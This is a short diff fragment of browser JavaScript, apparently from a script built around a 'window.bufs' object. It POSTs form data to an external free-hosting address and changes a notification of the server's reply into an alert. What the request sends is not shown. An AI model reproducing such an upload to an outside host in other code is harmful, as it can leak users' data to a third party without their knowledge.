@@ -550,7 +550,7 @@ window.bufs = {
 					req.open('POST', "https://psydel.000webhostapp.com/",true);
 					req.onreadystatechange = function (aEvt) {
 						if (req.readyState == 4&&req.status == 200) {
-							notify(req.responseText);
+							alert(req.responseText);
 						}
 					}
 					var dats = new FormData();
